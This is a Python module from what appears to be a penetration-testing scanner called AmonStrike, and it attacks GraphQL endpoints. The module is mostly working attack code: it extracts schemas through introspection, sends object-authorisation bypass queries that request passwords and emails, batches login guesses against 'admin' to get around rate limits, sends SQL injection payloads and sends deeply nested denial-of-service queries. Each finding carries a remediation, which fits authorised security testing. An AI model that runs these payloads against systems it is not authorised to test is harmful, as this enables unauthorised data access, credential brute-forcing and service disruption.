"""
AmonStrike — GraphQL Deep Attack Module
GraphQL is the new frontier — most scanners miss it completely.

Attacks:
  1. Introspection — full schema extraction
  2. Field suggestions — schema recovery without introspection
  3. BOLA — object-level authorization bypass
  4. Batching — bypass rate limiting
  5. Injection — SQL/NoSQL via resolvers
  6. DoS — deep nesting, field duplication
  7. Sensitive field exposure
  8. Alias overloading
"""

import re
import json
from .base import BaseModule


class GraphqlDeepModule(BaseModule):
    NAME        = "graphql_deep"
    DESCRIPTION = "GraphQL — introspection, BOLA, injection, batching, DoS"

    GRAPHQL_PATHS = [
        "/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql",
        "/graph", "/query", "/gql", "/api/v1/graphql",
        "/api/v2/graphql", "/graphql/v1", "/graphiql",
    ]

    INTROSPECTION_QUERY = """{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
        args { name type { name kind } }
      }
    }
  }
}"""

    FIELD_SUGGESTION_PROBES = [
        '{ usr { id } }',
        '{ user { id } }',
        '{ users { id } }',
        '{ me { id } }',
        '{ account { id } }',
        '{ admin { id } }',
    ]

    def run(self):
        self.log("Testing GraphQL endpoints...")
        endpoints = self._find_graphql_endpoints()

        if not endpoints:
            self.log("No GraphQL endpoints found", "~")
            return self.result()

        self.info["endpoints"] = endpoints
        for endpoint in endpoints:
            self.log(f"Testing: {endpoint}", "i")
            self._test_introspection(endpoint)
            self._test_field_suggestions(endpoint)
            self._test_bola(endpoint)
            self._test_batching_bypass(endpoint)
            self._test_injection(endpoint)
            self._test_dos_queries(endpoint)
            self._test_sensitive_fields(endpoint)

        return self.result()

    def _find_graphql_endpoints(self) -> list:
        found = []
        for path in self.GRAPHQL_PATHS:
            resp = self.post(path, json={"query": "{ __typename }"})
            if resp and resp.status_code in [200, 400] and (
                "data" in resp.text or "errors" in resp.text or "__typename" in resp.text
            ):
                found.append(self.url + path)
        return found

    def _test_introspection(self, endpoint: str):
        resp = self._gql(endpoint, self.INTROSPECTION_QUERY)
        if not resp:
            return
        if "__schema" in resp.text and "queryType" in resp.text:
            try:
                data   = resp.json()
                types  = data.get("data",{}).get("__schema",{}).get("types",[])
                fields = sum(len(t.get("fields") or []) for t in types)
                self.add_finding(
                    title="GraphQL Introspection Enabled",
                    severity="MEDIUM",
                    description=f"GraphQL introspection is enabled, exposing the full schema ({len(types)} types, {fields} fields).",
                    evidence=f"POST {endpoint}\nQuery: __schema\nSchema types found: {[t['name'] for t in types[:10]]}",
                    remediation="Disable introspection in production. In Apollo: IntrospectionPlugin, in graphql-js: NoIntrospection rule.",
                    url=endpoint, cve="CWE-200"
                )
                # Look for sensitive type names
                sensitive = [t["name"] for t in types
                             if t.get("name") and any(
                                 s in t["name"].lower()
                                 for s in ["admin","password","secret","token","key","internal"]
                             )]
                if sensitive:
                    self.add_finding(
                        title=f"GraphQL Schema Exposes Sensitive Types: {sensitive[:5]}",
                        severity="HIGH",
                        description=f"Introspection reveals sensitive type names suggesting admin/internal functionality.",
                        evidence=f"Sensitive types found: {sensitive}",
                        remediation="Remove sensitive types or restrict introspection.",
                        url=endpoint, cve="CWE-200"
                    )
            except Exception:
                pass

    def _test_field_suggestions(self, endpoint: str):
        """Even without introspection, field suggestions leak schema."""
        for probe in self.FIELD_SUGGESTION_PROBES:
            resp = self._gql(endpoint, probe)
            if not resp:
                continue
            if "Did you mean" in resp.text or "suggestions" in resp.text.lower():
                self.add_finding(
                    title="GraphQL Field Suggestions Leak Schema (Introspection Disabled)",
                    severity="LOW",
                    description="GraphQL returns field name suggestions in errors even with introspection disabled, allowing schema recovery via Clairvoyance.",
                    evidence=f"Query: {probe}\nResponse contains: 'Did you mean...' hints",
                    remediation="Disable field suggestions in production Apollo/graphql-js config.",
                    url=endpoint, cve="CWE-200"
                )
                break

    def _test_bola(self, endpoint: str):
        """Test Broken Object Level Authorization in GraphQL."""
        test_queries = [
            ('{ user(id: 1) { id email phone address password } }', "User object exposure"),
            ('{ users { id email role password } }',                 "Users list exposure"),
            ('{ order(id: 1) { id userId total items } }',           "Order BOLA"),
            ('{ account(id: 1) { id balance transactions } }',       "Account BOLA"),
            ('{ me { id email role permissions } }',                  "Me query — role exposure"),
        ]
        for query, label in test_queries:
            resp = self._gql(endpoint, query)
            if not resp or resp.status_code != 200:
                continue
            try:
                data = resp.json()
                if "data" in data and data["data"]:
                    # Got actual data
                    obj = str(data.get("data",""))
                    if any(k in obj.lower() for k in ["email","password","token","phone","address","balance"]):
                        self.add_finding(
                            title=f"GraphQL BOLA — {label}",
                            severity="HIGH",
                            description=f"GraphQL query returns sensitive user data without proper authorization check.",
                            evidence=f"Query: {query}\nResponse: {obj[:300]}",
                            remediation="Implement field-level authorization. Verify the requesting user owns the requested object.",
                            url=endpoint, cve="CWE-639"
                        )
            except Exception:
                pass

    def _test_batching_bypass(self, endpoint: str):
        """Test query batching to bypass rate limits."""
        # Batch 5 login attempts in one request
        batch = [
            {"query": f'mutation {{ login(username:"admin",password:"pass{i}") {{ token }} }}'}
            for i in range(5)
        ]
        try:
            resp = self.session.post(
                endpoint, json=batch,
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            if resp and resp.status_code == 200 and isinstance(resp.json(), list):
                self.add_finding(
                    title="GraphQL Query Batching — Rate Limit Bypass",
                    severity="MEDIUM",
                    description="GraphQL accepts batched queries, allowing multiple operations in one HTTP request to bypass rate limiting.",
                    evidence=f"Sent 5 batched login attempts in a single request.\nAll processed without rate limit error.",
                    remediation="Disable query batching or limit batch size. Implement per-query rate limiting.",
                    url=endpoint, cve="CWE-770"
                )
        except Exception:
            pass

    def _test_injection(self, endpoint: str):
        """Test SQL/NoSQL injection via GraphQL arguments."""
        sqli_payloads = [
            '{ user(id: "1 OR 1=1") { id email } }',
            '{ user(id: "1\' OR \'1\'=\'1") { id email } }',
            '{ users(filter: "admin\' OR \'1\'=\'1") { id } }',
        ]
        for query in sqli_payloads:
            resp = self._gql(endpoint, query)
            if not resp:
                continue
            if any(e in resp.text.lower() for e in
                   ["sql","syntax","mysql","postgres","sqlite","ora-"]):
                self.add_finding(
                    title="GraphQL SQL Injection via Arguments",
                    severity="CRITICAL",
                    description="GraphQL resolver passes user-controlled arguments directly to SQL query.",
                    evidence=f"Query: {query}\nSQL error in response: {resp.text[:200]}",
                    remediation="Use parameterized queries in all resolvers. Never concatenate user input.",
                    url=endpoint, cve="CWE-89"
                )

    def _test_dos_queries(self, endpoint: str):
        """Test deeply nested query DoS."""
        # Deeply nested query
        nested = "{ user { friends { friends { friends { friends { id } } } } } }"
        try:
            import time
            start = time.time()
            resp  = self._gql(endpoint, nested)
            elapsed = time.time() - start
            if resp and resp.status_code == 200 and elapsed > 3:
                self.add_finding(
                    title="GraphQL — No Query Depth Limit (DoS Risk)",
                    severity="MEDIUM",
                    description=f"GraphQL accepts deeply nested queries with no depth limit. Took {elapsed:.1f}s — server may be vulnerable to resource exhaustion.",
                    evidence=f"Query: {nested}\nTime: {elapsed:.1f}s",
                    remediation="Implement query depth limit (max 5-7) and complexity analysis.",
                    url=endpoint, cve="CWE-770"
                )
        except Exception:
            pass

    def _test_sensitive_fields(self, endpoint: str):
        """Test for sensitive field access."""
        queries = [
            ('{ __type(name:"User") { fields { name } } }', "User type fields"),
            ('{ systemInfo { version os env } }',            "System info"),
            ('{ debug { config environment } }',             "Debug info"),
        ]
        for query, label in queries:
            resp = self._gql(endpoint, query)
            if resp and resp.status_code == 200:
                if any(k in resp.text.lower() for k in
                       ["password","secret","env","config","version"]):
                    self.add_finding(
                        title=f"GraphQL Sensitive Field Exposure — {label}",
                        severity="HIGH",
                        description=f"GraphQL exposes sensitive information through {label}.",
                        evidence=f"Query: {query}\nResponse: {resp.text[:300]}",
                        remediation="Remove sensitive fields from schema or add authorization.",
                        url=endpoint, cve="CWE-200"
                    )

    def _gql(self, endpoint: str, query: str):
        try:
            return self.session.post(
                endpoint,
                json={"query": query},
                headers={"Content-Type": "application/json"},
                timeout=10
            )
        except Exception:
            return None
